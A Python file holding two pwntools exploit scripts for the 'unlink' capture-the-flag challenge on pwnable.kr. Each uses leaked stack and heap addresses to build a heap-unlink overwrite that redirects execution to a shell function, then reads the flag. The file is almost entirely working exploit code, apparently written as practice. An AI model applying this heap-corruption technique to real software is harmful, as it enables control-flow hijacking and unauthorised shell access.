from pwn import *

context.update(arch='i386', os='linux')
s = ssh(host='pwnable.kr', port=2222, user="unlink", password="guest")

p = s.process(executable='./unlink')

stack_addr = p.recvline_startswith("here is stack address leak: ").decode("utf-8")
stack_addr = stack_addr.replace("here is stack address leak: ", "")
stack_addr = int(stack_addr, base=16)

heap_addr = p.recvline_startswith("here is heap address leak: ").decode("utf-8")
heap_addr = heap_addr.replace("here is heap address leak: ", "")
heap_addr = int(heap_addr, base=16)

print(f"leaked stack address: {hex(stack_addr)}")
print(f"leaked heap address: {hex(heap_addr)}")

heap_padding = b"E" * 8
buf_padding = b"A" * 8
obj_size = 16
"""
heap layout:
<1024>
<8 padding>
<16 obj> <——— leaked
    - <4>
    - <4>
    - <8> <——— overwrite here
<8 padding>
<16 obj>
--
<8 padding>
<16 obj>
"""
exploit = buf_padding
exploit += heap_padding
exploit += p32(heap_addr + obj_size + len(heap_padding) + obj_size + len(heap_padding)) # B: fd # new ebp
exploit += p32(stack_addr - 28) # B: bk
exploit += buf_padding # wut
exploit += p32(0x80484eb)
exploit += p32(heap_addr + obj_size + len(heap_padding) + obj_size + len(heap_padding) - 4)
exploit += p32(0) # C: fd
exploit += p32(heap_addr + obj_size + len(heap_padding))

p.sendline(exploit)
p.sendline("cat flag")
p.interactive()
"""
b->fd->bk = b->bk
b->bk->fd = b->fd
"""

# asafniv :)






from pwn import *
context.arch = 'i386'   # i386 / arm
r = process(['/home/unlink/unlink'])

leak = r.recvuntil('shell!\n')

stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)

shell = 0x80484eb

payload = pack(shell)           # heap + 8  (new ret addr)
payload += pack(heap + 12)      # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'               # heap + 16
payload += '4444'
payload += pack(stack - 0x20)   # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)      # edx.

r.sendline( payload )
r.interactive()